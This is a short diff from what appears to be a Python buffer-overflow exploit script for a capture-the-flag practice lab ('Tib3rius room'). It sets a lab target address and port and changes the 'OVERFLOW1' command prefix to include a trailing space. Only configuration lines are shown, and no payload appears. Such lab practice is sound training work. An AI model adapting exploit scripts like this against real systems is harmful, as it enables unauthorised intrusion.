@@ -9,8 +9,8 @@ reminder = raw_input ("Remember to change addr (target), lhost/lport, and cmd")
 
 addr = ('10.10.182.234',1337)
 
-#Add command to send prepended to the buffer, eg. 'OVERFLOW6 .' for Tib3rius room overflow6
-cmd = "OVERFLOW1"
+#!!It is important to leave a space after the cmd name for some reason!!
+cmd = "OVERFLOW1 "
 
 
 #This pattern is 5000 chars
